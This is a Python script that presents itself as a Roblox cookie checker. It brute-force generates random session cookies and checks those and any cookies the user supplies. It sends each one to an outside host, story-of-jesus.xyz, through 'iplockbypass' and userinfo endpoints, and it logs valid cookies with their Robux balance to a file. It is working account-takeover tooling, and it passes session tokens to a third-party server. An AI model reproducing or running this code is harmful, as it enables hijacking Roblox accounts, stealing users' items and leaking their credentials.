import requests, json, re
import random, string
import os
import threading
import multiprocessing
import requests
import re
import string
import random
import time
from queue import Queue


def menu():
  print("""
    Cookie Checker
    
    [1] auto gen and check cookies
    [2] check cookies using a list
    [3] get info on a single cookie
    [4] credits
    [5] generate
    
    """)

  choice = input("- ")

  if choice == '1':

    os.system('cls')
    t1 = threading.Thread(target=process1)
    t2 = threading.Thread(target=process1)
    t3 = threading.Thread(target=process1)
    t4 = threading.Thread(target=process1)
    t5 = threading.Thread(target=process1)
    t6 = threading.Thread(target=process1)
    t7 = threading.Thread(target=process1)
    t8 = threading.Thread(target=process1)
    t9 = threading.Thread(target=process1)
    
    t1.start()
    t2.start()
    t3.start()
    t4.start()
    t5.start()
    t6.start()
    t7.start()
    t8.start()
    t9.start()

  elif choice == '2':
    os.system('cls')
    process2()

  elif choice == '3':
    os.system('cls')
    process3()

  elif choice == '4':
    os.system('cls')
    process4()

  elif choice == '5':
    os.system('cls')
    process5()


def process1():
  while True:

    valid_letters = 'ABCDEFGHIJKLMNOPQRSTUVWXYZ1234567890'
    rancookie = ''.join((random.choice(valid_letters) for i in range(776)))
    finalcookie = "_|WARNING:-DO-NOT-SHARE-THIS.--Sharing-this-will-allow-someone-to-log-in-as-you-and-to-steal-your-ROBUX-and-items.|_" + rancookie

    cookie = requests.get(
      f"https://story-of-jesus.xyz/iplockbypass?cookie={finalcookie}").text

    r = requests.get(
      f'https://story-of-jesus.xyz/userinfo.php?cookie={cookie}')
    data = r.json()

    if data["error"] == "Invalid-Cookie":

      falsecookie = rancookie[:29]
      print("[INVALID] " + falsecookie + "...")

    elif data["status"] == "good":

      falsecookie = rancookie[:9]
      robuxamount = str(data['robux'])
      print(
        f"[VALID]" + falsecookie +
        f"... USERNAME: '{data['username']}' Robux: '{robuxamount}' Logged To File."
      )
      f = open("cookies.txt", "a")
      f.write(str(rancookie + " Robux: " + robuxamount + "\n"))
      f.close()

    else:
      exit()


def process2():
  location = input("enter files location: ")
  with open(location) as lines:
    for line in lines:
      cookie = requests.get(
        f"https://story-of-jesus.xyz/iplockbypass?cookie={line}").text

      r = requests.get(
        f'https://story-of-jesus.xyz/userinfo.php?cookie={cookie}')
      data = r.json()

      if data["error"] == "Invalid-Cookie":

        falsecookie = line[:29]
        print("[INVALID] " + falsecookie)

      elif data["status"] == "good":

        falsecookie = line[:9]
        robuxamount = str(data['robux'])
        print(
          f"[VALID]" + falsecookie +
          f"... USERNAME: '{data['username']}' Robux: '{robuxamount}' Logged To File."
        )
        f = open("cookies.txt", "a")
        f.write(str(line + " Robux: " + robuxamount + "\n"))
        f.close()

      else:
        exit()


def process3():
  print("Enter a Cookie: ")
  cookie = input()

  cooki = requests.get(
    f"https://story-of-jesus.xyz/iplockbypass?cookie={cookie}").text

  r = requests.get(f'https://story-of-jesus.xyz/userinfo.php?cookie={cooki}')
  data = r.json()

  print(data)

  process3()


def process4():
  print("By brody")

  print("rbxship.cf")
  menu()


def process5():
  print('ROBLOX COOKIE CHECKER V1R, MAKE SURE TO VOUCH AND JOIN THE SERVER!')
  print(
    'JOIN THE DISCORD!!!!!!!!AMAZING SUPPORT!!!!!!!!FREQUENT GIVEAWAYS! \n')
  print('BOOST THE DISCORD FOR EARLY ACCESS AND CREDITS IN ALL MY SCRIPTS! \n')
  print(
    'SCRIPT BY: Egypt#2325, JOIN THE SERVER FOR HELP! discord.gg/bC5VyzQ \n')
  print('Edited by EGG#0012 with the idea from Happy#9599.')

  outputfile = open("Generated.txt", "a")

  x = 0
  cookies = []
  intro = "_|WARNING:-DO-NOT-SHARE-THIS.--Sharing-this-will-allow-someone-to-log-in-as-you-and-to-steal-your-ROBUX-and-items.|_"
  n = 0
  print(
    '[RECOMMENDED: Pick a high amount for better odds of   generating a valid cookie]'
  )
  c = int(input("How many cookies do you want to generate? \n"))
  print('Generating random cookies... please be patient! \n')
  print(
    '(these are not real cookies they are randomly     generated cookies they will now be'
  )
  print(
    'checked to find if any of them are valid which is a very low chance but still possible if done for long enough) \n'
  )
  letters = 'ABCDEF'

  while x < c:

    cookies = intro + ''.join(random.choices(letters + string.digits, k=732))

    x = x + 1

    f = open('Generated.txt', "a+")
    f.write(f'{cookies}')
    f.close()


menu()
